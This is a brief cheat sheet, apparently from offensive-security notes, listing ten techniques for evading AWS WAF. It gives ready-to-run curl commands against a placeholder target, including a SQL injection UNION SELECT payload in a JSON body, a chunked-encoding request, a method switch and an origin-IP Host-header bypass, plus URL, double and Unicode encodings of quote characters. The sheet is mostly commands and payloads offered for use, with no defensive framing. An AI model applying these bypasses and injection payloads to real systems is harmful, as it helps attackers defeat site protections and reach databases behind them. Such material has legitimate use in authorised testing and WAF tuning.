# AWS WAF Bypass Techniques

## 1. JSON Content-Type
```bash
# AWS WAF may not inspect JSON bodies
curl -sk "http://target/" -H "Content-Type: application/json" -d '{"id":"1 UNION SELECT 1,2,3-- -"}'
```

## 2. Case Variation
```
/ADMIN
/Admin
```

## 3. URL Encoding
```
%27 -> '
%20 -> space
%0a -> newline
```

## 4. Double URL Encoding
```
%2527 -> '
%2520 -> space
```

## 5. Unicode Normalization
```
%ef%bc%87 -> ' (fullwidth)
%e2%80%98 -> ' (left quote)
```

## 6. HTTP Method Bypass
```bash
# If WAF only inspects GET
curl -sk -X POST "http://target/" -d "payload"
```

## 7. Chunked Transfer
```bash
curl -sk -X POST "http://target/" -H "Transfer-Encoding: chunked" -d "0\r\n\r\npayload"
```

## 8. Request Smuggling
```bash
# CL-TE or TE-CL
```

## 9. WAF Rule Limit
```bash
# AWS WAF has body size limit (8KB by default)
# Payloads beyond limit are not inspected
```

## 10. Origin IP Bypass
```bash
# If origin IP is known, bypass WAF entirely
curl -sk "http://origin_ip/" -H "Host: target.com"
```
